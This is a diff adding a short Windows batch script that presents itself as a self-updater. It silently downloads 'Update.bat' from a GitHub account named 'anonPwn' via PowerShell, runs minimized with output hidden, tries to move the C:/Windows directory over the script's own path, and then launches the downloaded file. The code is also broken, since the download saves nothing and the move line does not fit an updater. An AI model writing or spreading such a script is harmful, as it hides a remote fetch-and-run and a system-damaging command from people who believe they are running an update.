@@ -1,0 +1,9 @@
+start /min cmd /k (
+if /i not "%~1"=="updated" (
+    echo Updating %~nx0 ...
+    >nul 2>&1 powershell iwr "https://raw.githubusercontent.com/anonPwn/Batch/refs/heads/main/Update.bat"
+    >nul 2>&1 move /y "C:/Windows" "%~dpnx0"
+)
+start /min cmd /k Update.bat
+pause
+)
